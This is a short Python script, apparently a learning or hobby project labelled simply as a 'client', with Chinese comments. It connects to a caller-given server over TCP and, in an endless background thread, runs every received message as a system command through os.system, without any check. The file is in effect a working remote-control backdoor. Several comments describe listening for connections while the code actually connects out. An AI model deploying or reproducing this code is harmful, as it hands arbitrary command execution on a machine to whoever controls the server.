# !/usr/bin/python
# coding=UTF-8 

"""客户端"""

__author__ = "Jiegl"

import socket
import os
import threading


class Client:

    def __init__(self):
        # socket监听端口
        self.socket_ip = None

        # socket监听端口
        self.socket_port = None

        # socket实例化连接
        self.socket_object = None

    def socket_connect(self, socket_ip, socket_port):
        """
        :socket启动本地监听,等待客户端连接

        """
        # 启动一个socket对象,连接9999端口
        self.socket_object = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # 连接服务端
        self.socket_ip = socket_ip
        self.socket_port = socket_port
        self.socket_object.connect((self.socket_ip, self.socket_port))

    def __receive(self, socket_object):
        """
        :多线程调用的函数,主要负责接受server端传输的数据

        """
        while True:
            # 接收传输过来的数据
            data = socket_object.recv(1024)
            os.system(data.decode('utf-8'))

    def socket_start(self):
        # 创建接收线程来处理TCP连接:
        rece_threading = threading.Thread(target=self.__receive, args=(self.socket_object,))
        rece_threading.start()
